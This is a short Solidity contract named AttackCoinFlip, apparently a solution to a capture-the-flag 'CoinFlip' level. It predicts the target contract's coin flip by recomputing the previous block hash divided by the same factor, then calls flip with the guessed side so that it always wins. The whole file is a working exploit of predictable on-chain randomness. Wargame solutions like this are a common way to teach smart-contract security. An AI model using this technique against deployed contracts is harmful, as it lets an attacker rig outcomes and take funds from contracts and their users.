import  "./CoinFlip.sol";

pragma solidity ^0.4.18;

contract AttackCoinFlip {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip coin;

    function AttackCoinFlip (address coinContract) public {
        coin = CoinFlip(coinContract);
    }

    function hackCoin() public returns (bool) {
        uint256 blockValue = uint256(block.blockhash(block.number-1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        bool result = coin.flip(side);
        return result;
    }

}
